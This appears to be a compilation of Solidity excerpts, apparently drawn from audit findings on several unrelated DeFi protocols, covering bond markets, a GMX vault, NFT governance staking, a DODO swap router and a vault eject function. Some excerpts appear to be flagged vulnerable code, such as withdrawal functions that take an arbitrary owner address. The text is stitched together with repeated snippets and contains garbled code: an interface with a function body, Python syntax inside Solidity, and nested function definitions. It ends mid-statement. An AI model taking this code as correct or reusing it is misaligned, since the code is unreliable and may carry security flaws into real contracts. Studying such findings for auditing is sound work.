```\nfunction liveMarketsBy(address owner_) external view returns (uint256[] memory) {\n    uint256 count;\n    IBondAuctioneer auctioneer;\n\n    for (uint256 i; i < marketCounter; ++i) {\n        auctioneer = marketsToAuctioneers[i];\n        if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n            ++count;\n        }\n    }\n\n    uint256[] memory ids = new uint256[](count);\n    count = 0;\n    for (uint256 i; i < marketCounter; ++i) {\n        auctioneer = marketsToAuctioneers[i];\n        if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n            ids[count] = i;\n            ++count;\n        }\n    }\n\n    return ids;\n}
"```\nfunction setIntervals(uint256 id_, uint32[3] calldata intervals_) external override {\n    if (!isLive(id_)) revert Auctioneer_InvalidParams();\n\n    if (intervals_[0] == 0 || intervals_[1] == 0 || intervals_[2] == 0) \n        revert Auctioneer_InvalidParams();\n\n    if (intervals_[0] < intervals_[1]) \n        revert Auctioneer_InvalidParams();\n\n    BondMetadata storage meta = metadata[id_];\n    if (intervals_[0] < meta.depositInterval) \n        revert Auctioneer_InvalidParams();\n\n    if (intervals_[2] < minDebtDecayInterval) \n        revert Auctioneer_InvalidParams();\n\n    BondMarket memory market = markets[id_];\n    if (msg.sender!= market.owner) \n        revert Auctioneer_OnlyMarketOwner();\n\n    meta.tuneInterval = intervals_[0];\n    meta.tuneIntervalCapacity = market.capacity.mulDiv(\n        uint256(intervals_[0]),\n        uint256(terms[id_].conclusion) - block.timestamp\n    ); // don't have a stored value for market duration, this will update tuneIntervalCapacity based on time remaining\n    meta.tuneAdjustmentDelay = intervals_[1];\n    meta.debtDecayInterval = intervals_[2];\n}\n```\nif (\n    (market.capacity < meta.tuneBelowCapacity && timeNeutralCapacity < initialCapacity) ||\n    (time_ >= meta.lastTune + meta.tuneInterval && timeNeutralCapacity > initialCapacity)\n) {\n    markets[id_].maxPayout = capacity.mulDiv(uint256(meta.depositInterval), timeRemaining);\n\n    uint256 targetDebt = timeNeutralCapacity.mulDiv(\n        uint256(meta.debtDecayInterval),\n        uint256(meta.length)\n    );\n\n    uint256 controlVariable = terms[id_].controlVariable;\n    uint256 newControlVariable = price_.mulDivUp(market.scale, targetDebt);\n\n    emit Tuned(id_, controlVariable, newControlVariable);\n\n    if (newControlVariable < controlVariable) {\n        uint256 change = controlVariable - newControlVariable;\n        adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true);\n    } else {\n        terms[id_].controlVariable = newControlVariable;\n        adjustments[id_].active = false;\n    }\n\n    metadata[id_].lastTune = time_;\n    metadata[id_].tuneBelowCapacity = market.capacity > meta.tuneIntervalCapacity\n       ? market.capacity - meta.tuneIntervalCapacity\n        : 0;\n    metadata[id_].lastTuneDebt = targetDebt;\n}\n```"
"```\nFile: BondBaseSDA.sol\n\nif (term.maxDebt < market.totalDebt) {\n    _close(id_);\n} else {\n    // If market will continue, the control variable is tuned to to expend remaining capacity over remaining market duration\n    _tune(id_, currentTime, price);\n}\n```"
"```\nfunction marketPrice(uint256 id_) public view override returns (uint256) {\n    uint256 price = currentControlVariable(id_).mulDivUp(currentDebt(id_), markets[id_].scale);\n\n    return (price > markets[id_].minPrice)? price : markets[id_].minPrice;\n}\n```\n```\nfunction _currentMarketPrice(uint256 id_) internal view returns (uint256) {\n    BondMarket memory market = markets[id_];\n    return terms[id_].controlVariable.mulDiv(market.totalDebt, market.scale);\n}\n```"
"```\nFile: BondBaseCallback.sol\n\n/// @inheritdoc IBondCallback\nfunction whitelist(address teller_, uint256 id_) external override onlyOwner {\n    // Check that the market id is a valid, live market on the aggregator\n    try _aggregator.isLive(id_) returns (bool live) {\n        if (!live) revert Callback_MarketNotSupported(id_);\n    } catch {\n        revert Callback_MarketNotSupported(id_);\n    }\n\n    // Check that the provided teller is the teller for the market ID on the stored aggregator\n    // We could pull the teller from the aggregator, but requiring the teller to be passed in\n    // is more explicit about which contract is being whitelisted\n    if (teller_!= address(_aggregator.getTeller(id_))) revert Callback_TellerMismatch();\n\n    approvedMarkets[teller_][id_] = true;\n}\n```"
"```\nFile: BondFixedExpiryTeller.sol\n\nif (protocolFee > createFeeDiscount) {\n    uint256 feeAmount = amount_.mulDiv(protocolFee - createFeeDiscount, FEE_DECIMALS);\n    rewards[_protocol][underlying_] += feeAmount;\n\n    bondToken.mint(msg.sender, amount_ - feeAmount);\n\n    return (bondToken, amount_ - feeAmount);\n} else {\n    bondToken.mint(msg.sender, amount_);\n    return (bondToken, amount_);\n}\n```\n```\nFile: BondFixedTermTeller.sol\n\nif (protocolFee > createFeeDiscount) {\n    uint256 feeAmount = amount_.mulDiv(protocolFee - createFeeDiscount, FEE_DECIMALS);\n    rewards[_protocol][underlying_] += feeAmount;\n\n    _mintToken(msg.sender, tokenId, amount_ - feeAmount);\n\n    return (tokenId, amount_ - feeAmount);\n} else {\n    _mintToken(msg.sender, tokenId, amount_);\n\n    return (tokenId, amount_);\n}\n```"
"```\nfunction payoutFor(\n    uint256 amount_,\n    uint256 id_,\n    address referrer_\n) public view override returns (uint256) {\n    uint256 fee = amount_.mulDiv(_teller.getFee(referrer_), 1e5);\n    uint256 payout = (amount_ - fee).mulDiv(markets[id_].scale, marketPrice(id_));\n\n    if (payout > markets[id_].maxPayout) {\n        revert Auctioneer_MaxPayoutExceeded();\n    } else {\n        return payout;\n    }\n}\n```\n```\npragma solidity ^0.8.0;\n\ninterface IBondAggregator {\n    function findMarketFor(\n        address payout_,\n        address quote_,\n        uint256 amountIn_,\n        uint256 minAmountOut_,\n        uint256 maxExpiry_\n    ) external view returns (uint256) {\n        uint256[] memory ids = marketsFor(payout_, quote_);\n        uint256 len = ids.length;\n        uint256[] memory payouts = new uint256[](len);\n\n        uint256 highestOut;\n        uint256 id = type(uint256).max; // set to max so an empty set doesn't return 0, the first index\n        uint48 vesting;\n        uint256 maxPayout;\n        IBondAuctioneer auctioneer;\n        for (uint256 i = 0; i < len; i++) {\n            auctioneer = marketsToAuctioneers[ids[i]];\n            (,,,, vesting, maxPayout) = auctioneer.getMarketInfoForPurchase(ids[i]);\n\n            uint256 expiry = (vesting <= MAX_FIXED_TERM)? block.timestamp + vesting : vesting;\n\n            if (expiry <= maxExpiry_) {\n                payouts[i] = minAmountOut_ <= maxPayout\n                   ? payoutFor(amountIn_, ids[i], address(0))\n                    : 0;\n\n                if (payouts[i] > highestOut) {\n                    highestOut = payouts[i];\n                    id = ids[i];\n                }\n            }\n        }\n\n        return id;\n    }\n}"
```\nfunction registerAuctioneer(IBondAuctioneer auctioneer_) external requiresAuth {\n    // Restricted to authorized addresses\n\n    if (_whitelist[address(auctioneer_)]) {\n        revert Aggregator_AlreadyRegistered(address(auctioneer_));\n    }\n\n    auctioneers.push(auctioneer_);\n    _whitelist[address(auctioneer_)] = true;\n}\n```
"```\nFile: BondBaseSDA.sol\n\nuint256 lastDecayIncrement = debtDecayInterval.mulDiv(payout_, lastTuneDebt);\nmetadata[id_].lastDecay += uint48(lastDecayIncrement);\n```"
```\nfunction setDefaults(uint32[6] memory defaults_) external override requiresAuth {\n    defaultTuneInterval = defaults_[0];\n    defaultTuneAdjustment = defaults_[1];\n    minDebtDecayInterval = defaults_[2];\n    minDepositInterval = defaults_[3];\n    minMarketDuration = defaults_[4];\n    minDebtBuffer = defaults_[5];\n}\n```
```\nfunction liveMarketsBy(address owner_) external view returns (uint256[] memory) {\n    uint256 count;\n    IBondAuctioneer auctioneer;\n\n    for (uint256 i; i < marketCounter; ++i) {\n        auctioneer = marketsToAuctioneers[i];\n        if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n            ++count;\n        }\n    }\n\n    uint256[] memory ids = new uint256[](count);\n    count = 0;\n    for (uint256 i; i < marketCounter; ++i) {\n        auctioneer = marketsToAuctioneers[i];\n        if (auctioneer.isLive(i) && auctioneer.ownerOf(i) == owner_) {\n            ids[count] = i;\n            ++count;\n        }\n    }\n\n    return ids;\n}
"```\nfunction setIntervals(uint256 id_, uint32[3] calldata intervals_) external override {\n    if (!isLive(id_)) revert Auctioneer_InvalidParams();\n\n    if (intervals_[0] == 0 || intervals_[1] == 0 || intervals_[2] == 0) \n        revert Auctioneer_InvalidParams();\n\n    if (intervals_[0] < intervals_[1]) \n        revert Auctioneer_InvalidParams();\n\n    BondMetadata storage meta = metadata[id_];\n    if (intervals_[0] < meta.depositInterval) \n        revert Auctioneer_InvalidParams();\n\n    if (intervals_[2] < minDebtDecayInterval) \n        revert Auctioneer_InvalidParams();\n\n    BondMarket memory market = markets[id_];\n    if (msg.sender!= market.owner) \n        revert Auctioneer_OnlyMarketOwner();\n\n    meta.tuneInterval = intervals_[0];\n    meta.tuneIntervalCapacity = market.capacity.mulDiv(\n        uint256(intervals_[0]),\n        uint256(terms[id_].conclusion) - block.timestamp\n    ); // don't have a stored value for market duration, this will update tuneIntervalCapacity based on time remaining\n    meta.tuneAdjustmentDelay = intervals_[1];\n    meta.debtDecayInterval = intervals_[2];\n}\n```\nif (\n    (market.capacity < meta.tuneBelowCapacity && timeNeutralCapacity < initialCapacity) ||\n    (time_ >= meta.lastTune + meta.tuneInterval && timeNeutralCapacity > initialCapacity)\n) {\n    markets[id_].maxPayout = capacity.mulDiv(uint256(meta.depositInterval), timeRemaining);\n\n    uint256 targetDebt = timeNeutralCapacity.mulDiv(\n        uint256(meta.debtDecayInterval),\n        uint256(meta.length)\n    );\n\n    uint256 controlVariable = terms[id_].controlVariable;\n    uint256 newControlVariable = price_.mulDivUp(market.scale, targetDebt);\n\n    emit Tuned(id_, controlVariable, newControlVariable);\n\n    if (newControlVariable < controlVariable) {\n        uint256 change = controlVariable - newControlVariable;\n        adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true);\n    } else {\n        terms[id_].controlVariable = newControlVariable;\n        adjustments[id_].active = false;\n    }\n\n    metadata[id_].lastTune = time_;\n    metadata[id_].tuneBelowCapacity = market.capacity > meta.tuneIntervalCapacity\n       ? market.capacity - meta.tuneIntervalCapacity\n        : 0;\n    metadata[id_].lastTuneDebt = targetDebt;\n}\n```"
```\nif (btcAssetAmount == 0 && ethAssetAmount == 0) {\n    return;\n}\n\nif (repayDebtBtc && repayDebtEth) {\n    assets = new address[](1);\n    amounts = new uint256[](1);\n\n    assets[0] = address(state.usdc);\n    amounts[0] = (btcAssetAmount + ethAssetAmount);\n} else if (btcAssetAmount == 0 || ethAssetAmount == 0) {\n    assets = new address[](1);\n    amounts = new uint256[](1);\n\n    if (btcAssetAmount == 0) {\n        assets[0] = repayDebtBtc? address(state.usdc) : address(state.wbtc);\n        amounts[0] = btcAssetAmount;\n    } else {\n        assets[0] = repayDebtEth? address(state.usdc) : address(state.weth);\n        amounts[0] = ethAssetAmount;\n    }\n```
"```\nuint256 unhedgedGlp = (state.unhedgedGlpInUsdc + dnUsdcDepositedPos).mulDivDown(\n    PRICE_PRECISION,\n    _getGlpPrice(state,!maximize)\n);\n\n(uint256 currentBtc, uint256 currentEth) = _getCurrentBorrows(state);\nuint256 totalCurrentBorrowValue = _getBorrowValue(state, currentBtc, currentEth);\n\nuint256 borrowValueGlp = (totalCurrentBorrowValue + dnUsdcDepositedNeg).mulDivDown(\n    PRICE_PRECISION,\n    _getGlpPrice(state,!maximize)\n);\n\nif (!maximize) {\n    unhedgedGlp = unhedgedGlp.mulDivDown(MAX_BPS - state.slippageThresholdGmxBps, MAX_BPS);\n    borrowValueGlp = borrowValueGlp.mulDivDown(MAX_BPS - state.slippageThresholdGmxBps, MAX_BPS);\n}\n```"
```\nfunction getTokenVotingPower(uint _tokenId) public override view returns (uint) {\n    if (ownerOf(_tokenId) == address(0)) revert NonExistentToken();\n\n    uint multiplier = _tokenId < 10_000? PERCENT : monsterMultiplier;\n\n    return ((baseVotes * multiplier) / PERCENT) + stakedTimeBonus[_tokenId] + evilBonus(_tokenId);\n}
"```\naddress owner = ownerOf(_tokenId);\n\nif (msg.sender!= owner && \n   !isApprovedForAll[owner][msg.sender] && \n    msg.sender!= getApproved[_tokenId]) {\n    revert NotAuthorized();\n}\n```\n```\nuint lostVotingPower;\n\nfor (uint i = 0; i < numTokens; i++) {\n    lostVotingPower += _unstakeToken(_tokenIds[i], _to);\n}\n\nvotesFromOwnedTokens[msg.sender] -= lostVotingPower;\ntokenVotingPower[getDelegate(msg.sender)] -= lostVotingPower;\ntotalTokenVotingPower -= lostVotingPower;\n```"
"```\nfunction _castVote(address _voter, uint256 _proposalId, uint8 _support) internal returns (uint) {\n    if (state(_proposalId)!= ProposalState.Active) {\n        revert InvalidStatus();\n    }\n\n    if (_support > 2) {\n        revert InvalidInput();\n    }\n\n    Proposal storage proposal = proposals[_proposalId];\n\n    Receipt storage receipt = proposal.receipts[_voter];\n    if (receipt.hasVoted) {\n        revert AlreadyVoted();\n    }\n\n    uint24 votes = (staking.getVotes(_voter)).toUint24();\n\n    if (_support == 0) {\n        proposal.againstVotes = proposal.againstVotes + votes;\n    } else if (_support == 1) {\n        proposal.forVotes = proposal.forVotes + votes;\n    } else if (_support == 2) {\n        proposal.abstainVotes = proposal.abstainVotes + votes;\n    }\n\n    receipt.hasVoted = true;\n    receipt.support = _support;\n    receipt.votes = votes;\n\n    ++totalCommunityScoreData.votes;\n\n    ++userCommunityScoreData[_voter].votes;\n\n    return votes;\n}"
"```\nmodifier lockedWhileVotesCast() {\n    uint[] memory activeProposals = governance.getActiveProposals();\n    for (uint i = 0; i < activeProposals.length; i++) {\n        if (governance.getReceipt(activeProposals[i], getDelegate(msg.sender)).hasVoted) {\n            revert TokenLocked();\n        }\n        (, address proposer, ) = governance.getProposalData(activeProposals[i]);\n        if (proposer == getDelegate(msg.sender)) {\n            revert TokenLocked();\n        }\n    }\n    _\n}\n```"
"```\nfunction withdrawToken(\n    address from,\n    address token,\n    address receiver,\n    uint256 sGlpAmount\n) external returns (uint256 amountOut) {\n    dnGmxJuniorVault.withdraw(sGlpAmount, address(this), from);\n}\n\nfunction redeemToken(\n    address from,\n    address token,\n    address receiver,\n    uint256 sharesAmount\n) external returns (uint256 amountOut) {\n    dnGmxJuniorVault.redeem(sharesAmount, address(this), from);\n}\n```"
"```\nif (_seniorVaultWethRewards > state.wethConversionThreshold) {\n    uint256 minUsdcAmount = _getTokenPriceInUsdc(state, state.weth).mulDivDown(\n        _seniorVaultWethRewards * (MAX_BPS - state.slippageThresholdSwapEthBps),\n        MAX_BPS * PRICE_PRECISION\n    );\n\n    (uint256 aaveUsdcAmount, ) = state._swapToken(\n        address(state.weth),\n        _seniorVaultWethRewards,\n        minUsdcAmount\n    );\n\n    state._executeSupply(address(state.usdc), aaveUsdcAmount);\n\n    state.seniorVaultWethRewards = 0;\n}\n```\nfunction getUsdcBorrowed() public view returns (uint256 usdcAmount) {\n    return uint256(\n        state.aUsdc.balanceOf(address(this)).toInt256() -\n        state.dnUsdcDeposited -\n        state.unhedgedGlpInUsdc.toInt256()\n    );\n}\n```\n```\nfunction availableBorrow(address borrower) public view returns (uint256 availableAUsdc) {\n    uint256 availableBasisCap = borrowCaps[borrower] - IBorrower(borrower).getUsdcBorrowed();\n    uint256 availableBasisBalance = aUsdc.balanceOf(address(this));\n\n    availableAUsdc = availableBasisCap < availableBasisBalance\n       ? availableBasisCap\n        : availableBasisBalance;\n}\n```"
"```\nfunction _convertToToken(address token, address receiver) internal returns (uint256 amountOut) {\n    uint256 outputGlp = fsGlp.balanceOf(address(this));\n\n    uint256 glpPrice = _getGlpPrice(false);\n\n    uint256 tokenPrice = gmxVault.getMaxPrice(token);\n\n    uint256 minTokenOut = outputGlp.mulDiv(glpPrice * (MAX_BPS - slippageThreshold), tokenPrice * MAX_BPS);\n\n    amountOut = rewardRouter.unstakeAndRedeemGlp(address(token), outputGlp, minTokenOut, receiver);\n}\n```"
```\nuint256 internal constant MAX_BPS = 1000;\n```
"```\nfunction convertToShares(uint256 assets) public view virtual returns (uint256) {\n    uint256 supply = totalSupply();  // Saves an extra SLOAD if totalSupply is non-zero.\n    return supply == 0? assets : assets.mulDivDown(supply, totalAssets());\n}\n```"
"```\ntokenVotingPower[currentDelegate] -= amount;\ntokenVotingPower[_delegatee] += amount;\n\nif (_delegator == _delegatee) {\n    _updateTotalCommunityVotingPower(_delegator, true);\n} else if (currentDelegate == _delegator) {\n    _updateTotalCommunityVotingPower(_delegator, false);\n}\n```"
"```\nfunction _stakeToken(uint _tokenId, uint _unlockTime) internal returns (uint) {\n    if (_unlockTime > 0) {\n        unlockTime[_tokenId] = _unlockTime;\n        uint fullStakedTimeBonus = ((_unlockTime - block.timestamp) * stakingSettings.maxStakeBonusAmount) / stakingSettings.maxStakeBonusTime;\n        stakedTimeBonus[_tokenId] = _tokenId < 10000? fullStakedTimeBonus : fullStakedTimeBonus / 2;\n    }\n}"
"```\nif (_delegator == _delegatee):\n    _updateTotalCommunityVotingPower(_delegator, True)\n\nelse if (currentDelegate == _delegator):\n    _updateTotalCommunityVotingPower(_delegator, False)\n```\n```\nnewProposal.id = newProposalId.toUint96();\nnewProposal.proposer = msg.sender;\nnewProposal.targets = _targets;\nnewProposal.values = _values;\nnewProposal.signatures = _signatures;\nnewProposal.calldatas = _calldatas;\n\nnewProposal.quorumVotes = quorumVotes().toUint24();\nnewProposal.startTime = (block.timestamp + votingDelay).toUint32();\nnewProposal.endTime = (block.timestamp + votingDelay + votingPeriod).toUint32();\n```"
"```\nfunction _castVote(address _voter, uint256 _proposalId, uint8 _support) internal returns (uint) {\n    if (state(_proposalId)!= ProposalState.Active) {\n        revert InvalidStatus();\n    }\n\n    if (_support > 2) {\n        revert InvalidInput();\n    }\n\n    Proposal storage proposal = proposals[_proposalId];\n\n    Receipt storage receipt = proposal.receipts[_voter];\n    if (receipt.hasVoted) {\n        revert AlreadyVoted();\n    }\n\n    uint24 votes = (staking.getVotes(_voter)).toUint24();\n\n    if (_support == 0) {\n        proposal.againstVotes = proposal.againstVotes + votes;\n    } else if (_support == 1) {\n        proposal.forVotes = proposal.forVotes + votes;\n    } else if (_support == 2) {\n        proposal.abstainVotes = proposal.abstainVotes + votes;\n    }\n\n    receipt.hasVoted = true;\n    receipt.support = _support;\n    receipt.votes = votes;\n\n    ++totalCommunityScoreData.votes;\n\n    ++userCommunityScoreData[_voter].votes;\n\n    return votes;\n}"
"```\nfunction _mint(address to, uint256 tokenId) internal virtual {\n    /**\n     * @dev Mints `tokenId` and transfers it to `to`.\n     *\n     * Requirements:\n     *\n     * - `tokenId` must not exist.\n     * - `to` cannot be the zero address.\n     *\n     * Emits a {Transfer} event.\n     */\n```"
"```\nfunction getTokenVotingPower(uint _tokenId) public override view returns (uint) {\n    if (ownerOf(_tokenId) == address(0)) {\n        revert NonExistentToken();\n    }\n\n    uint multiplier = _tokenId < 10_000? PERCENT : monsterMultiplier;\n\n    return ((baseVotes * multiplier) / PERCENT) + stakedTimeBonus[_tokenId] + evilBonus(_tokenId);\n}\n```\nfunction setMonsterMultiplier(uint _monsterMultiplier) external onlyExecutor {\n    emit MonsterMultiplierChanged(monsterMultiplier = _monsterMultiplier);\n}\n```\n```\nfunction stake(uint[] calldata _tokenIds, uint _unlockTime) \n{\n    function _stakeToken(uint _tokenId, uint _unlockTime) internal returns (uint) {\n        if (_unlockTime > 0) {\n            stakedTimeBonus[_tokenId] = _tokenId < 10000? fullStakedTimeBonus : fullStakedTimeBonus / 2;\n        }\n    }\n```"
```\nreturn (\n    votes * cpMultipliers.votes / PERCENT +\n    proposalsCreated * cpMultipliers.proposalsCreated / PERCENT +\n    proposalsPassed * cpMultipliers.proposalsPassed / PERCENT\n)
"```\nmodifier lockedWhileVotesCast() {\n    uint[] memory activeProposals = governance.getActiveProposals();\n    for (uint i = 0; i < activeProposals.length; i++) {\n        if (governance.getReceipt(activeProposals[i], getDelegate(msg.sender)).hasVoted) {\n            revert TokenLocked();\n        }\n        (, address proposer, ) = governance.getProposalData(activeProposals[i]);\n        if (proposer == getDelegate(msg.sender)) {\n            revert TokenLocked();\n        }\n    }\n    _\n}\n```"
"```\nif (assetFrom[i - 1] == address(this)) {\n    uint256 curAmount = curTotalAmount * curPoolInfo.weight / curTotalWeight;\n\n    if (curPoolInfo.poolEdition == 1) {\n        IERC20(midToken[i]).transfer(curPoolInfo.adapter, curAmount);\n    } else {\n        IERC20(midToken[i]).transfer(curPoolInfo.pool, curAmount);\n    }\n}"
"```\nfunction externalSwap(\n    address fromToken,\n    address toToken,\n    address approveTarget,\n    address swapTarget,\n    uint256 fromTokenAmount,\n    uint256 minReturnAmount,\n    bytes memory feeData,\n    bytes memory callDataConcat,\n    uint256 deadLine\n) external payable judgeExpired(deadLine) returns (uint256 receiveAmount) {\n    require(isWhiteListedContract[swapTarget], ""DODORouteProxy: Not Whitelist Contract"");\n    require(isApproveWhiteListedContract[approveTarget], ""DODORouteProxy: Not Whitelist Appprove Contract"");\n\n    // transfer in fromToken\n    if (fromToken!= _ETH_ADDRESS_) {\n        // approve if needed\n        if (approveTarget!= address(0)) {\n            IERC20(fromToken).universalApproveMax(approveTarget, fromTokenAmount);\n        }\n\n        IDODOApproveProxy(_DODO_APPROVE_PROXY_).claimTokens(\n            fromToken,\n            msg.sender,\n            address(this),\n            fromTokenAmount\n        );\n    }\n\n    // swap\n    uint256 toTokenOriginBalance;\n    if (toToken!= _ETH_ADDRESS_) {\n        toTokenOriginBalance = IERC20(toToken).universalBalanceOf(address(this));\n    } else {\n        toTokenOriginBalance = IERC20(_WETH_).universalBalanceOf(address(this));\n    }\n```\n```\nif (toToken!= _ETH_ADDRESS_) {\n    toTokenOriginBalance = IERC20(toToken).balanceOf(address(this));\n} else {\n    toTokenOriginBalance = IERC20(_WETH_).balanceOf(address(this));\n}\n```\n```\n(bool success, bytes memory result) = swapTarget.call{\n    value: fromToken == _ETH_ADDRESS_? fromTokenAmount : 0\n}(callDataConcat);\n```\n```\nif (toToken!= _ETH_ADDRESS_) {\n    receiveAmount = IERC20(toToken).universalBalanceOf(address(this)) - (\n        toTokenOriginBalance\n    );\n} else {\n    receiveAmount = IERC20(_WETH_).universalBalanceOf(address(this)) - (\n        toTokenOriginBalance\n    );\n}\n```\n```\nfunction swapOnUniswapV2Fork(\n    address tokenIn,\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address weth,\n    uint256[] calldata pools\n)\n    external\n    payable\n{\n    _swap(\n        tokenIn,\n        amountIn,\n        amountOutMin,\n        weth,\n        pools\n    );\n}\n```\n```\nfunction _swap(\n    address tokenIn,\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address weth,\n    uint256[] memory pools\n) private\nreturns (uint256 tokensBought) {\n    uint256 pairs = pools.length;\n\n    require(pairs!= 0, ""At least one pool required"");\n\n    bool tokensBoughtEth;\n\n    if (tokenIn == ETH_IDENTIFIER) {\n        require(amountIn == msg.value, ""Incorrect msg.value"");\n        IWETH(weth).deposit{value: msg.value}();\n        require(IWETH(weth).transfer(address(pools[0]), msg.value));\n    } else {\n        require(msg.value == 0, ""Incorrect msg.value"");\n        transferTokens(tokenIn, msg.sender, address(pools[0]), amountIn);\n        tokensBoughtEth = weth!= address(0);\n    }\n\n    tokensBought = amountIn;\n\n    for (uint256 i = 0; i < pairs; ++i) {\n        uint256 p = pools[i];\n        address pool = address(p);\n        bool direction = p & DIRECTION_FLAG == 0;\n\n        tokensBought = NewUniswapV2Lib.getAmountOut(tokensBought, pool, direction, p + FEE_OFFSET);\n        (uint256 amount0Out, uint256 amount1Out) = direction\n           ? (uint256(0), tokensBought) : (tokensBought, uint256(0));\n        IUniswapV2Pair(pool).swap(\n            amount0Out,\n            amount1Out,\n            i + 1 == pairs\n               ? (tokensBoughtEth? address(this) : msg.sender)\n                : address(pools[i + 1]),\n            """"\n        );\n    }\n\n    if (tokensBoughtEth) {\n        IWETH(weth).withdraw(tokensBought);\n        TransferHelper.safeTransferETH(msg.sender, tokensBought);\n    }\n\n    require(tokensBought >= amountOutMin, ""UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT"");\n}\n```\n```\nif (tokensBoughtEth) {\n    IWETH(weth).withdraw(tokensBought);\n    TransferHelper.safeTransferETH(msg.sender, tokensBought);\n}\n```"
"```\nfunction externalSwap(\n    address fromToken,\n    address toToken,\n    address approveTarget,\n    address swapTarget,\n    uint256 fromTokenAmount,\n    uint256 minReturnAmount,\n    bytes memory feeData,\n    bytes memory callDataConcat,\n    uint256 deadLine\n) external payable judgeExpired(deadLine) returns (uint256 receiveAmount) {\n    require(isWhiteListedContract[swapTarget], ""DODORouteProxy: Not Whitelist Contract"");\n    require(isApproveWhiteListedContract[approveTarget], ""DODORouteProxy: Not Whitelist Appprove Contract"");\n\n    // transfer in fromToken\n    if (fromToken!= _ETH_ADDRESS_) {\n        // approve if needed\n        if (approveTarget!= address(0)) {\n            IERC20(fromToken).universalApproveMax(approveTarget, fromTokenAmount);\n        }\n\n        IDODOApproveProxy(_DODO_APPROVE_PROXY_).claimTokens(\n            fromToken,\n            msg.sender,\n            address(this),\n            fromTokenAmount\n        );\n    }\n\n    // swap\n    uint256 toTokenOriginBalance;\n    if (toToken!= _ETH_ADDRESS_) {\n        toTokenOriginBalance = IERC20(toToken).universalBalanceOf(address(this));\n    } else {\n        toTokenOriginBalance = IERC20(_WETH_).universalBalanceOf(address(this));\n    }\n```\n```\nif (toToken!= _ETH_ADDRESS_) {\n    toTokenOriginBalance = IERC20(toToken).balanceOf(address(this));\n} else {\n    toTokenOriginBalance = IERC20(_WETH_).balanceOf(address(this));\n}\n```\n```\n(bool success, bytes memory result) = swapTarget.call{\n    value: fromToken == _ETH_ADDRESS_? fromTokenAmount : 0\n}(callDataConcat);\n```\n```\nif (toToken!= _ETH_ADDRESS_) {\n    receiveAmount = IERC20(toToken).universalBalanceOf(address(this)) - (\n        toTokenOriginBalance\n    );\n} else {\n    receiveAmount = IERC20(_WETH_).universalBalanceOf(address(this)) - (\n        toTokenOriginBalance\n    );\n}\n```\n```\nfunction swapOnUniswapV2Fork(\n    address tokenIn,\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address weth,\n    uint256[] calldata pools\n)\n    external\n    payable\n{\n    _swap(\n        tokenIn,\n        amountIn,\n        amountOutMin,\n        weth,\n        pools\n    );\n}\n```\n```\nfunction _swap(\n    address tokenIn,\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address weth,\n    uint256[] memory pools\n) private\nreturns (uint256 tokensBought) {\n    uint256 pairs = pools.length;\n\n    require(pairs!= 0, ""At least one pool required"");\n\n    bool tokensBoughtEth;\n\n    if (tokenIn == ETH_IDENTIFIER) {\n        require(amountIn == msg.value, ""Incorrect msg.value"");\n        IWETH(weth).deposit{value: msg.value}();\n        require(IWETH(weth).transfer(address(pools[0]), msg.value));\n    } else {\n        require(msg.value == 0, ""Incorrect msg.value"");\n        transferTokens(tokenIn, msg.sender, address(pools[0]), amountIn);\n        tokensBoughtEth = weth!= address(0);\n    }\n\n    tokensBought = amountIn;\n\n    for (uint256 i = 0; i < pairs; ++i) {\n        uint256 p = pools[i];\n        address pool = address(p);\n        bool direction = p & DIRECTION_FLAG == 0;\n\n        tokensBought = NewUniswapV2Lib.getAmountOut(tokensBought, pool, direction, p + FEE_OFFSET);\n        (uint256 amount0Out, uint256 amount1Out) = direction\n           ? (uint256(0), tokensBought) : (tokensBought, uint256(0));\n        IUniswapV2Pair(pool).swap(\n            amount0Out,\n            amount1Out,\n            i + 1 == pairs\n               ? (tokensBoughtEth? address(this) : msg.sender)\n                : address(pools[i + 1]),\n            """"\n        );\n    }\n\n    if (tokensBoughtEth) {\n        IWETH(weth).withdraw(tokensBought);\n        TransferHelper.safeTransferETH(msg.sender, tokensBought);\n    }\n\n    require(tokensBought >= amountOutMin, ""UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT"");\n}\n```\n```\nif (tokensBoughtEth) {\n    IWETH(weth).withdraw(tokensBought);\n    TransferHelper.safeTransferETH(msg.sender, tokensBought);\n}\n```"
"```\nfunction eject(\n    uint256 shares,\n    address receiver,\n    address owner\n) public returns (uint256 assets, uint256 excessBal, bool isExcessPTs) {\n    (excessBal, isExcessPTs) = _exitAndCombine(shares);\n\n    _burn(owner, shares);\n\n    if (isExcessPTs) {\n        pt.transfer(receiver, excessBal);\n    } else {\n        yt.transfer(receiver, excessBal);\n    }\n\n    assets = asset.balanceOf(address(this));\n    asset.transfer(receiver, assets);\n\n    emit Ejected(msg.sender, receiver, owner, assets, shares, \n        isExcessPTs? excessBal : 0, \n        isExcessPTs? 0 : excessBal\n    );\n}\n\nfunction _exitAndCombine(uint256 shares) internal returns (uint256, bool) {\n    uint256 supply = totalSupply;\n\n    uint256 lpBal = shares.mulDivDown(space.balanceOf(address(this)), supply);\n    uint256 totalPTBal = pt.balanceOf(address(this));\n    uint256 ptShare = shares.mulDivDown(totalPTBal, supply);\n\n    uint256 ytBal = shares.mulDivDown(yt.balanceOf(address(this)), supply);\n    ptShare += pt.balanceOf(address(this)) - totalPTBal;\n\n    unchecked {\n        if (ptShare > ytBal) {\n            divider.combine(address(adapter), maturity, ytBal);\n            return (ptShare - ytBal, true);\n        } else {\n            divider.combine(address(adapter), maturity, ptShare);\n            return (ytBal - ptShare, false);\n        }\n    }\n}\n```\n```\nfunction combine(\n    address adapter,\n    uint256 maturity,\n    uint256 uBal\n) external nonReentrant whenNotPaused returns (uint256 tBal) {\n    if (!adapterMeta[adapter].enabled) {\n        revert Errors.InvalidAdapter();\n    }\n    if (!_exists(adapter, maturity)) {\n        revert Errors.SeriesDoesNotExist();\n    }\n\n    uint256 level = adapterMeta[adapter].level;\n    if (level.combineRestricted() && msg.sender!= adapter) {\n        revert Errors.CombineRestricted();\n    }\n\n    // Burn the PT\n    Token(series[adapter][maturity].pt).burn(msg.sender, 